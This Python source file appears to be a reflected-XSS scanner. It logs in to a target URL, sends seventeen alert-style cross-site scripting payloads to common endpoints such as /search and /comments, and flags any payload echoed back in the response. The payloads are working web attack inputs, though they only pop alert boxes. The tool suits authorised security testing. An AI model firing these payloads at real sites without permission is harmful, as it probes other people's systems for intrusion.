import requests
import sys
from halo import Halo
from models.functions import Functions, logging

# List of common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",  # Simple script injection
    "<img src=x onerror=alert('XSS')>",  # Image event-based XSS
    "<svg/onload=alert('XSS')>",  # SVG tag with onload event
    "' onmouseover=alert('XSS')",  # Mouse event trigger
    "</script><script>alert('XSS')</script>",  # Closing and injecting a new script tag
    "\"><script>alert('XSS')</script>",  # Breaking out of an HTML attribute
    "'><script>alert('XSS')</script>",  # Injecting into an attribute
    "` ;alert('XSS');//",  # Inline JavaScript injection
    "javascript:alert('XSS')",  # URI scheme attack
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",  # Iframe-based attack
    "<body onload=alert('XSS')>",  # Body onload event trigger
    "<details open ontoggle=alert('XSS')>",  # Exploiting <details> element
    "<a href=javascript:alert('XSS')>Click me</a>",  # Malicious hyperlink
    "<input type=text value='' onfocus=alert('XSS')>",  # Input field focus event
    "<form><button formaction=javascript:alert('XSS')>Click me</button></form>",  # Form action-based XSS
    "<marquee onstart=alert('XSS')>XSS</marquee>",  # Outdated <marquee> event trigger
    "<math><mtext><style onload=alert('XSS')></style></mtext></math>",  # MathML-based XSS
]

def test_xss():
    first_run = True
    while True:
        if not first_run:
            print("\nDo you want to run the test again?")
            user_input = input("Enter 'yes' to restart or 'no' to quit: ").strip().lower()
            if user_input == "no":
                print("Exiting...")
                sys.exit()
            elif user_input != "yes":
                continue
        
        first_run = False
        url = Functions.get_url()
        
        try:
            session = requests.Session()
            cookies = Functions.perform_login(url)
            for cookie in cookies:
                session.cookies.set(cookie['name'], cookie['value'])
            
            spinner = Halo(text='Testing XSS vulnerabilities...', spinner='dots')
            spinner.start()
            
            # List of common endpoints to test for XSS
            endpoints = ["/search", "/login", "/profile", "/comments", "/feedback"]
            
            for endpoint in endpoints:
                for payload in XSS_PAYLOADS:
                    test_url = f"{url}{endpoint}?q={payload}"
                    response = session.get(test_url, allow_redirects=False)
                    
                    if payload in response.text:
                        result = f"⚠️ Potential XSS detected at: {test_url}"
                    else:
                        result = f"✅ No XSS at: {test_url}"
                    
                    print(result)
                    logging.info(Functions.remove_emojis(result))
                    
            spinner.stop()
            
        except Exception as e:
            error_msg = f"Error: {e}"
            print(error_msg)
            logging.error(error_msg)

if __name__ == "__main__":
    Functions.setup_logger_xss()
    Functions.banner_xss()
    test_xss()